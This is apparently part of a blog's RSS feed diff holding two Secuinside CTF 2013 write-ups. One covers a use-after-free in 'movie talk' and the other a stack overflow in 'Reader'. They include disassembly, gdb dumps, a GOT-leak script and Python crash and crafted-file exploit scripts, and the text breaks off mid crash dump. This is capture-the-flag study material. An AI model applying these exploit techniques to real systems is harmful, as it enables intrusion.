+        <category>nginx</category>
+        
+        
+        <category>research</category>
+        
+      </item>
+    
+      <item>
+        <title>[Secuinside CTF 2013] movie talk</title>
+        <description>&lt;p&gt;Challenge itself is very interesting, as we have typical use-after-free problem. It’s running on Ubuntu 13.04 with NX + ASLR.&lt;/p&gt;
+
+&lt;p&gt;When we run challenge it gives us message as :&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;######################################
+#                                    #
+#   Welcome to the movie talk show   #
+#                                    #
+######################################
+
+1. movie addition
+2. movie deletion
+3. my movie list
+4. quit
+:
+&lt;/pre&gt;
+
+&lt;p&gt;movie addition is very straight forward:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:080489F4                 mov     dword ptr [esp], 14h ; size
+.text:080489FB                 call    _malloc
+.text:08048A00                 mov     [ebp+movie_array], eax
+.text:08048A03                 cmp     [ebp+movie_array], 0
+.text:08048A07                 jnz     short __mem_alloc_ok
+&lt;/pre&gt;
+
+&lt;p&gt;Alloc struct to hold movie_list which is described like this:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;00000000 movie_list      struc ; (sizeof=0x14)
+00000000 fn_moviedetails dd ?
+00000004 movie_name      dd ?
+00000008 movie_id        dd ?
+0000000C movie_rating    dd ?
+00000010 movie_rate      dd ?
+&lt;/pre&gt;
+
+&lt;p&gt;Than we have small sleep of 2 seconds here:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:0804880A ; signed int __cdecl get_film_name_rating(movie_list a1)
+.text:0804880A get_film_name_rating proc near
+.text:0804880A                 push    ebp
+.text:0804880B                 mov     ebp, esp
+.text:0804880D                 sub     esp, 58h
+.text:08048810                 mov     eax, [ebp+movie_array.fn_moviedetails]
+.text:08048813                 mov     [ebp+l_movie_array], eax
+.text:08048816                 mov     eax, large gs:14h
+.text:0804881C                 mov     [ebp+cookie], eax
+.text:0804881F                 xor     eax, eax
+.text:08048821                 mov     dword ptr [esp], 2 ; seconds
+.text:08048828                 call    _sleep   &amp;lt;--- very important here is this sleep remember it for later
+&lt;/pre&gt;
+
+&lt;p&gt;than movie name is obtained from input:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:0804882D                 mov     dword ptr [esp], offset aMovieName ; &quot;movie name: &quot;
+.text:08048834                 call    _printf
+.text:08048839                 mov     eax, ds:stdin
+.text:0804883E                 mov     [esp+8], eax    ; stream
+.text:08048842                 mov     dword ptr [esp+4], 1Eh ; n
+.text:0804884A                 lea     eax, [ebp+nptr]
+.text:0804884D                 mov     [esp], eax      ; s
+.text:08048850                 call    _fgets
+.text:08048855                 lea     eax, [ebp+nptr]
+.text:08048858                 mov     [esp], eax      ; s
+.text:0804885B                 call    _strlen
+.text:08048860                 mov     [ebp+n], eax
+.text:08048863                 mov     eax, [ebp+n]
+.text:08048866                 add     eax, 1
+.text:08048869                 mov     [esp], eax      ; size
+.text:0804886C                 call    _malloc          &amp;lt;--- malloc (also very important)
+&lt;/pre&gt;
+
+&lt;p&gt;Other code is not important, as it reads movie rating, which can be in range from 0-101 (although code says movie rating 1-100), not really important. Also application asks for movie_rate which can be in range:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;mov     dword ptr [esp], offset aFilmRate012151 ; &quot;film rate [0,12,15,19]: &quot;
+&lt;/pre&gt;
+
+&lt;p&gt;Than ID of movie is assigned which is it’s current place in array of movies, and not actual ID, and function to display movie is stored also as part of movie_list struct.&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048989                 mov     edx, ds:g_count_of_array
+.text:0804898F                 mov     eax, [ebp+l_movie_array]
+.text:08048992                 mov     [eax+movie_list.movie_id], edx
+.text:08048995                 mov     eax, [ebp+l_movie_array]
+.text:08048998                 mov     [eax+movie_list.fn_moviedetails], offset PutMovieDetails
+.text:0804899E                 mov     eax, 1
+&lt;/pre&gt;
+
+&lt;p&gt;We noticed first that we can assign random ID to the movie, buy deleting them, and were looking at this code first. For example, when deleting movie this code is used to get it’s index:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048AFB                 call    _fgets
+.text:08048B00                 movzx   eax, [ebp+s]
+.text:08048B04                 movsx   eax, al
+.text:08048B07                 sub     eax, 31h
+&lt;/pre&gt;
+
+&lt;p&gt;Obviously, if we enter 10 it will always delete movie at index 0, as it considers only one char, thus we were looking where we can confuse program to reuse wrong index. Not good… nothing found. Code seemed like very well written, without errors. Every movie delete would fill gaps in array, thus code really seemed bullet-proof.&lt;/p&gt;
+
+&lt;p&gt;When code is about to exit, there was one function called, which would free whole array of movies:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048C3B                 push    ebp
+.text:08048C3C                 mov     ebp, esp
+.text:08048C3E                 sub     esp, 28h
+.text:08048C41                 mov     [ebp+index], 0
+.text:08048C48                 jmp     short loc_8048C94
+.text:08048C4A __loop_delete:
+.text:08048C4A                 mov     eax, [ebp+index]
+.text:08048C4D                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C54                 test    eax, eax
+.text:08048C56                 jz      short __no_movie
+.text:08048C58                 mov     eax, [ebp+index]
+.text:08048C5B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C62                 mov     eax, [eax+movie_list.movie_name]
+.text:08048C65                 test    eax, eax
+.text:08048C67                 jz      short __no_movie
+.text:08048C69                 mov     eax, [ebp+index]
+.text:08048C6C                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C73                 mov     eax, [eax+movie_list.movie_name]
+.text:08048C76                 mov     [esp], eax      ; ptr
+.text:08048C79                 call    _free
+.text:08048C7E                 mov     eax, [ebp+index]
+.text:08048C81                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C88                 mov     [esp], eax      ; ptr
+.text:08048C8B                 call    _free
+.text:08048C90
+.text:08048C90 __no_movie:
+.text:08048C90                 add     [ebp+index], 1
+.text:08048C94
+.text:08048C94 loc_8048C94:
+.text:08048C94                 cmp     [ebp+index], 9
+.text:08048C98                 jbe     short __loop_delete
+.text:08048C9A                 leave
+.text:08048C9B                 ret
+&lt;/pre&gt;
+
+&lt;p&gt;This function, would give us full control over arrays of movies, as we could free movies, and reuse freed memory to be used later during printing movie:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048BFA                 mov     eax, [ebp+index]
+.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C04                 test    eax, eax
+.text:08048C06                 jz      short loc_8048C23
+.text:08048C08                 mov     eax, [ebp+index]
+.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
+.text:08048C14                 mov     edx, [ebp+index]
+.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
+.text:08048C1E                 mov     [esp], edx
+.text:08048C21                 call    eax      &amp;lt;-- if we free we could reuse movie.fn_moviedetails
+ to execute our code.
+&lt;/pre&gt;
+
+&lt;p&gt;Than we saw something interesting:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048CA5                 mov     dword ptr [esp+4], offset handler ; handler
+.text:08048CAD                 mov     dword ptr [esp], 3 ; sig
+.text:08048CB4                 call    _signal         ; SIGQUIT
+&lt;/pre&gt;
+
+&lt;p&gt;We can invoke free on all lists by sending signal 3 to the process, so we can actually free structs. When we run into it, in a few sec we had working poc:** @__suto** replied on skype : 0×41414141 , and at the same time I replied with 0×61616161 so we knew we have eip control. Now I’ll try to explain how we got to this point. We found also way to leak address of puts from GOT thus we can recalculate system address and call system(“cat key.txt”), as this point we handed POC to &lt;strong&gt;xichzo&lt;/strong&gt; which soon got key, and we got 550 &lt;img src=&quot;http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/p&gt;
+
+&lt;p&gt;Leaking address is something we didn’t manage to do, as application can’t be piped to receive data in real time, eg. pipe is flushed only when process dies, thus even if we leak address it wouldn’t be too much use, as on next run address would be different. So here we go for explanation of our use-after-free exploit:&lt;/p&gt;
+
+&lt;p&gt;Break after 1st malloc when adding movie:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;--------------------------------------------------------------------------[regs]
+ EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
+ ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048A00
+ CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+--------------------------------------------------------------------------1
+=&amp;gt; 0x8048a00:    mov    DWORD PTR [ebp-0x10],eax
+ 0x8048a03:    cmp    DWORD PTR [ebp-0x10],0x0
+ 0x8048a07:    jne    0x8048a15
+ 0x8048a09:    mov    DWORD PTR [esp],0x8048e93
+ 0x8048a10:    call   0x80486fc
+ 0x8048a15:    mov    eax,DWORD PTR [ebp-0x10]
+ 0x8048a18:    mov    DWORD PTR [esp],eax
+ 0x8048a1b:    call   0x804880a
+--------------------------------------------------------------------------------
+
+Breakpoint 1, 0x08048a00 in ?? ()
+&lt;/pre&gt;
+
+&lt;p&gt;Now comes sleep of 2 seconds, and we allocate 1st movie. This is very important to look at memory layout once 1st movie is added:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb$ dd 0x804c008
+[0x007B:0x0804C008]-------------------------------------------------------[data]
+0x0804C008 : AA 87 04 08 20 C0 04 08 - 01 00 00 00 00 00 00 00 .... ...........
+0x0804C018 : 00 00 00 00 19 00 00 00 - 61 61 61 61 61 61 61 61 ........aaaaaaaa
+0x0804C028 : 61 61 61 61 61 61 0A 00 - 00 00 00 00 D1 0F 02 00 aaaaaa..........
+0x0804C038 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
+0x0804C048 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
+0x0804C058 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
+&lt;/pre&gt;
+
+&lt;p&gt;So movie_list is:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;00000000 fn_moviedetails        0x080487AA      &amp;lt;--- display function
+00000004 movie_name             0x0804C020      &amp;lt;--- movie name
+00000008 movie_id               0x1             &amp;lt;--- index in global array of movies (not important)
+0000000C movie_rating           0x0             &amp;lt;--- dummy value which we set to be 0
+00000010 movie_rate             0x0             &amp;lt;--- dummy value which we set to be 0
+&lt;/pre&gt;
+
+&lt;p&gt;Lets observe memory when we allocate 2nd movie_list:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;EAX = 0x0804C038        &amp;lt;--- right after our movie name string.
+&lt;/pre&gt;
+
+&lt;p&gt;Now when process goes into sleep(2) at :&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048821                 mov     dword ptr [esp], 2 ; seconds
+.text:08048828                 call    _sleep
+&lt;/pre&gt;
+
+&lt;p&gt;We will fire killall -3 movie_talk to free memory occupied by 1st movie_list, and malloc for movie_name will be allocated here. To make it easier for debugging we can cheat by increasing timer to 32 sec:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;--------------------------------------------------------------------------[regs]
+ EAX: 0x00000000  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C038  o d I t s Z a P c
+ ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048828
+ CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+--------------------------------------------------------------------------1
+=&amp;gt; 0x8048828:    call   0x8048550 &amp;lt;sleep@plt&amp;gt;
+ 0x804882d:    mov    DWORD PTR [esp],0x8048e86
+ 0x8048834:    call   0x8048500 &amp;lt;printf@plt&amp;gt;
+ 0x8048839:    mov    eax,ds:0x804b064
+ 0x804883e:    mov    DWORD PTR [esp+0x8],eax
+ 0x8048842:    mov    DWORD PTR [esp+0x4],0x1e
+ 0x804884a:    lea    eax,[ebp-0x2a]
+ 0x804884d:    mov    DWORD PTR [esp],eax
+--------------------------------------------------------------------------------
+0x08048828 in ?? ()
+gdb$ break *0x804882d
+Breakpoint 15 at 0x804882d
+gdb$ set *(unsigned int *)$esp = 0x20
+gdb$
+
+...
+=&amp;gt; 0xb7fdd424 &amp;lt;__kernel_vsyscall+16&amp;gt;:    pop    ebp
+ 0xb7fdd425 &amp;lt;__kernel_vsyscall+17&amp;gt;:    pop    edx
+ 0xb7fdd426 &amp;lt;__kernel_vsyscall+18&amp;gt;:    pop    ecx
+ 0xb7fdd427 &amp;lt;__kernel_vsyscall+19&amp;gt;:    ret
+&lt;/pre&gt;
+
+&lt;p&gt;Signal fired, and we can continue:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;=&amp;gt; 0x804882d:    mov    DWORD PTR [esp],0x8048e86
+ 0x8048834:    call   0x8048500 &amp;lt;printf@plt&amp;gt;
+ &lt;/pre&gt;
+
+&lt;p&gt;Now watch for malloc:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;--------------------------------------------------------------------------[regs]
+ EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
+ ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048871
+ CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+--------------------------------------------------------------------------1
+=&amp;gt; 0x8048871:    mov    edx,eax
+ 0x8048873:    mov    eax,DWORD PTR [ebp-0x3c]
+ 0x8048876:    mov    DWORD PTR [eax+0x4],edx
+ 0x8048879:    mov    eax,DWORD PTR [ebp-0x3c]
+ 0x804887c:    mov    eax,DWORD PTR [eax+0x4]
+ 0x804887f:    test   eax,eax
+ 0x8048881:    jne    0x804888f
+ 0x8048883:    mov    DWORD PTR [esp],0x8048e93
+--------------------------------------------------------------------------------
+
+Temporary breakpoint 20, 0x08048871 in ?? ()&amp;lt;/pre&amp;gt;
+EAX = 0x804C008 &amp;lt;--- where we had 1st movie list, thus we control movie_list and
+function pointer at movie_list.fn_moviedetails
+&lt;/pre&gt;
+
+&lt;p&gt;Lets look at memory after input is copied there:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb$ dd 0x804c008
+[0x007B:0x0804C008]-------------------------------------------------------[data]
+0x0804C008 : 61 61 61 61 61 61 61 61 - 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
+0x0804C018 : 0A 00 00 00 19 00 00 00 - 00 00 00 00 61 61 61 61 ............aaaa
+0x0804C028 : 61 61 61 61 61 61 61 61 - 0A 00 00 00 19 00 00 00 aaaaaaaa........
+0x0804C038 : 00 00 00 00 08 C0 04 08 - 00 00 00 00 00 00 00 00 ................
+0x0804C048 : 00 00 00 00 B9 0F 02 00 - 00 00 00 00 00 00 00 00 ................
+&lt;/pre&gt;
+
+&lt;p&gt;Woops, 1st movie_lsit is overwriten, now we can list movies and watch how our&lt;br /&gt;
+data goes to 0x61616161:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;.text:08048BFA                 mov     eax, [ebp+index]
+.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C04                 test    eax, eax
+.text:08048C06                 jz      short loc_8048C23
+.text:08048C08                 mov     eax, [ebp+index]
+.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
+.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
+.text:08048C14                 mov     edx, [ebp+index]
+.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
+.text:08048C1E                 mov     [esp], edx
+.text:08048C21                 call    eax
+
+--------------------------------------------------------------------------[regs]
+ EAX: 0x61616161  EBX: 0xB7FC3000  ECX: 0xB7FDA000  EDX: 0x0804C008  o d I t s z a p c
+ ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048C21
+ CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+--------------------------------------------------------------------------1
+=&amp;gt; 0x8048c21:    call   eax
+ 0x8048c23:    add    DWORD PTR [ebp-0xc],0x1
+&lt;/pre&gt;
+
+&lt;p&gt;What is also important to notice here, is that movie list is pushed on stack, that means that stack layout is pointing to our controled buffer, so whatever we put into this movie_name, can be used as  argument for our code:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb$ x/4wx $esp
+0xbffff150:    0x0804c008    0x0000000c    0xb7fc3ac0    0xb7e13900
+               ^^^^^^^^^^
+                   |
+                   +---- our controled input
+
+&lt;/pre&gt;
+
+&lt;p&gt;Address leak bonus, which was our 1st idea to get system address right away, was to leak puts address and do subtraction, unfortunately due to writing to pipe output would only come when pipe buffer is filled or process is terminated, so our idea didn’t work, but for fun here is our code to leak puts address:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb$ p puts-system
+$1 = 0x26cf0
+&lt;/pre&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;import time
+import struct
+import os
+import subprocess
+
+proc = subprocess.Popen(&quot;./movie_talk&quot;,
+                        #shell=True,
+                        stdin = subprocess.PIPE,
+                        stdout = subprocess.PIP,
+                        stderr = subprocess.PIPE);
+
+payload = &quot;1n&quot; + &quot;a&quot; * 16 + &quot;n0n0n&quot;
+
+#leak address of puts on ubuntu 13.04
+payload += &quot;1n&quot;;
+payload += struct.pack(&quot;&amp;lt;L&quot;, 0x80487aa);
+payload += struct.pack(&quot;&amp;lt;L&quot;, 0x804b030);
+payload += struct.pack(&quot;&amp;lt;L&quot;, 0x804b030);
+payload += &quot;n0n0n&quot;
+payload += &quot;3n&quot;;
+proc.stdin.write(payload);
+time.sleep(3);
+os.system(&quot;killall -3 movie_talk&quot;);
+time.sleep(5);
+proc.stdin.write(&quot;4n&quot;);
+proc.wait();
+buff = proc.stdout.read();
+index = buff.find(&quot;movie id: 134524976&quot;);
+index+=7;
+index+=len(&quot;movie id: 134524976&quot;);
+data = struct.unpack(&quot;&amp;lt;L&quot;, buff[index:index+4]);
+for x in data:
+    print(&quot;puts address   : 0x%.08X&quot; % x);
+    print(&quot;system address : 0x%.08X&quot; % (x-0x26cf0));
+&lt;/pre&gt;
+
+&lt;p&gt;and simple exploit to crash process (enable core dump):&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;#!/usr/bin/env python
+import  subprocess
+import  time
+import  os
+
+proc = subprocess.Popen(&quot;./movie_talk&quot;,
+                       shell=False,
+                       stdin=subprocess.PIPE);
+
+proc.stdin.write(&quot;1n&quot; + &quot;a&quot;*16+&quot;n&quot;+&quot;0n0n&quot;);
+proc.stdin.write(&quot;1n&quot; + &quot;a&quot;*16+&quot;n&quot;+&quot;0n0n&quot;); &amp;lt;-- payload goes here
+time.sleep(3);
+os.system(&quot;killall -3 movie_talk&quot;);
+proc.stdin.write(&quot;3n&quot;);
+proc.stdin.write(&quot;4n&quot;);
+proc.wait();
+
+&lt;/pre&gt;
+</description>
+        <pubDate>Thu, 30 May 2013 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</link>
+        <guid isPermaLink="true">http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</guid>
+        
+        <category>CLGT</category>
+        
+        <category>CTF</category>
+        
+        <category>exploit</category>
+        
+        <category>use-after-free</category>
+        
+        
+        <category>ctf - clgt crew</category>
+        
+      </item>
+    
+      <item>
+        <title>[Secuinside CTF 2013] Reader Writeup</title>
+        <description>&lt;p&gt;&lt;em&gt;Description:&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://war.secuinside.com/files/reader&lt;/p&gt;
+
+  &lt;p&gt;ip : 59.9.131.155&lt;br /&gt;
+port : 8282 (SSH)&lt;br /&gt;
+account : guest / guest&lt;/p&gt;
+
+  &lt;p&gt;We have obtained a program designed for giving orders to criminals.&lt;/p&gt;
+
+  &lt;p&gt;Our investigators haven’t yet analyzed the file format this program reads.&lt;/p&gt;
+
+  &lt;p&gt;Please help us analyze the file format this program uses, find a vulnerability, and take a shell.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;From the description we can know this challenge requires an input file with correct format. Since it is simple to determine that format, I won’t talk deeper, you can find the details in sub_0804891A.&lt;br /&gt;
+So I will show the vulnerability in this “Reader”.&lt;/p&gt;
+
+&lt;p&gt;Below is the main routine of this challenge:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;int __cdecl sub_80490B8(signed int a1, int a2)
+{
+  int v2; // ecx@7
+  int result; // eax@7
+  int file; // [sp+20h] [bp-90h]@4
+  char buffer[140]; // [sp+24h] [bp-8Ch]@1
+
+  *(_DWORD *)&amp;amp;buffer[136] = *MK_FP(__GS__, 20);
+  if ( a1 &amp;lt;= 1 )
+  {
+    printf(&quot;Usage: %s &amp;lt;FILENAME&amp;gt;n&quot;, *(_DWORD *)a2);
+    exit(1);
+  }
+  sub_8048825(*(const char **)(a2 + 4));
+  file = open(*(const char **)(a2 + 4), 0);
+  if ( file &amp;lt; 0 )
+  {
+    perror(&amp;amp;byte_8049322);
+    exit(1);
+  }
+  pre_path(file, (_DWORD *)buffer);
+  vuln_path((_DWORD *)buffer);
+  free_path((_DWORD *)buffer);
+  close(file);
+  result = 0;
+  if ( *MK_FP(__GS__, 20) != *(_DWORD *)&amp;amp;buffer[136] )
+    __stack_chk_fail(v2, *MK_FP(__GS__, 20) ^ *(_DWORD *)&amp;amp;buffer[136]);
+  return result;
+}
+&lt;/pre&gt;
+
+&lt;p&gt;As you can see, variable buffer is used in multiple locations. After some minutes review I saw an interesting point in sub_08048C7A:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;int __cdecl vuln_path_(_DWORD *BUFF)
+{
+  size_t ulen; // eax@4
+  int v2; // edx@4
+  int v3; // ecx@4
+  int result; // eax@4
+  unsigned int i; // [sp+28h] [bp-20h]@1
+  int v6; // [sp+3Ch] [bp-Ch]@1
+
+  v6 = *MK_FP(__GS__, 20);
+  for ( i = 0; BUFF[2] &amp;gt; i; ++i )
+  {
+    putchar(*(_BYTE *)(BUFF[7] + i));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+  ulen = strlen((const char *)BUFF + 83);       // re-cal length (1)
+  strncpy(BUFF[6], gPTR, ulen);                 // overflow occurs
+  puts(&quot;n&quot;);
+  result = *MK_FP(__GS__, 20) ^ v6;
+  if ( *MK_FP(__GS__, 20) != v6 )
+    __stack_chk_fail(v3, v2);
+  return result;
+}
+&lt;/pre&gt;
+
+&lt;p&gt;The &lt;em&gt;strncpy()&lt;/em&gt; function copies &lt;strong&gt;ulen&lt;/strong&gt; bytes from &lt;strong&gt;gPTR&lt;/strong&gt; to &lt;strong&gt;BUFF[6]&lt;/strong&gt; without any limit check. So I back to main routine to see where &lt;strong&gt;BUFF[6]&lt;/strong&gt; is initialized, and it is located in sub_08048D41:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;unsigned int index; // [sp+18h] [bp-20h]@1
+  int s[7]; // [sp+1Ch] [bp-1Ch]@1
+
+  bzero(s, 0x14u);
+  putchar(10);
+  for ( index = 0; *BUFF &amp;gt; index; ++index )
+  {
+    putchar(*(_BYTE *)(BUFF[5] + index));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+  printf(&quot;nn &quot;);
+  for ( index = 0; BUFF[1] + 4 &amp;gt; index; ++index )
+  {
+    putchar(*((_BYTE *)BUFF + 16));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+ .....
+ .....
+  BUFF[6] = &amp;index;
+ .....
+ .....
+&lt;/pre&gt;
+
+&lt;p&gt;So &lt;strong&gt;BUFF[6]&lt;/strong&gt; is set to address of local variable of this function, we can clearly see this function is not protected by stack cookie. So it is just a simple buffer overflow issue. We can craft a valid file format and see where it gets the input to calculate &lt;strong&gt;ulen&lt;/strong&gt; in (1). Back to sub_0804891A we can see:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;*BUFF = *(_DWORD *)&amp;buf;
+  read(fd, &amp;amp;buf, 4u);
+  BUFF[1] = *(_DWORD *)&amp;buf;                    // read 4 bytes from file
+  read(fd, &amp;amp;buf, 4u);
+  BUFF[2] = *(_DWORD *)&amp;buf;
+  read(fd, &amp;amp;buf, 4u);
+  BUFF[3] = *(_DWORD *)&amp;buf;
+  read(fd, &amp;amp;buf, 1u);
+  *((_BYTE *)BUFF + 16) = buf;
+  if ( *BUFF &amp;lt;= 4u || *BUFF &amp;gt; 0x32u || BUFF[1] &amp;gt; 0x64u || BUFF[2] &amp;gt; 0x320u || !*((_BYTE *)BUFF + 16) )// 0x4-0x32 0x64 0x32
+    ((void (__cdecl *)(_DWORD))ERR)(&quot;Initialization error&quot;);
+  Copy(&amp;amp;buf, (char *)BUFF + 32);
+  BUFF[5] = malloc(*BUFF);
+  if ( !BUFF[5] )
+    ((void (__cdecl *)(_DWORD))ERR)(&quot;malloc() function error&quot;);
+  BUFF[6] = malloc(BUFF[1]);                    // use 4 bytes read above to malloc -&amp;gt; BUFF[6] will has this length
+  gPTR = (void *)BUFF[6]; -&amp;gt; Set gPTR to BUFF[6]
+  if ( !BUFF[6] )
+    ((void (__cdecl *)(_DWORD))ERR)(&quot;malloc() function error&quot;);
+  BUFF[7] = malloc(BUFF[2]);
+  if ( !BUFF[7] )
+    ((void (__cdecl *)(_DWORD))ERR)(&quot;malloc() function error&quot;);
+  bzero((void *)BUFF[5], *BUFF);
+  bzero((void *)BUFF[6], BUFF[1]);
+  bzero((void *)BUFF[7], BUFF[2]);
+  read(fd, (void *)BUFF[5], *BUFF);
+  read(fd, (void *)BUFF[6], BUFF[1]);
+  read(fd, (void *)BUFF[7], BUFF[2]);
+&lt;/pre&gt;
+
+&lt;p&gt;Since it checks &lt;strong&gt;BUFF[1]&lt;/strong&gt; with 0×64, I blindly set it to 0×63 to maximize the len of &lt;strong&gt;gPTR&lt;/strong&gt; string and got a nice crash, so no need to do further investigation. Below is python code to generate valid &lt;em&gt;“test.sec”&lt;/em&gt; file and trigger the crash:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: python; title: ; notranslate&quot; title=&quot;&quot;&gt;data = &quot;xff&quot; + &quot;SECUINSIDE&quot; + &quot;x00&quot; + &quot;Ax00&quot;+&quot;A&quot;*26 +&quot;CCCC&quot; + &quot;B&quot;*(100-4-28) +&quot;xff&quot;*4
+       + &quot;x08x00x00x00&quot;
+       + &quot;x63x00x00x00&quot; # will become BUFF[1] and length of BUFF[6]
+       + &quot;x32x00x00x00&quot;
+       + &quot;x00x00x00x00&quot;
+       + &quot;X&quot;*200
+file = open(&quot;test.sec&quot;,&quot;w&quot;)
+file.write(data)
+file.close()
+&lt;/pre&gt;
+
+&lt;p&gt;Run reader with &lt;em&gt;test.sec&lt;/em&gt; and we got a crash looks like:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;- THE END -
+document identifier code: 14821847921482184792148218479214821847921482184792
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x2
+EBX: 0xb7fcfff4 --&amp;gt; 0x1a0d7c
+ECX: 0xffffffff
+EDX: 0xb7fd18b8 --&amp;gt; 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x58585858 ('XXXX')
+ESP: 0xbffff640 (&quot;XXXXXXXXXX&quot;)
+EIP: 0x58585858 ('XXXX')
+EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x58585858
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff640 (&quot;XXXXXXXXXX&quot;)
+0004| 0xbffff644 (&quot;XXXXXX&quot;)
+0008| 0xbffff648 --&amp;gt; 0x5858 ('XX')
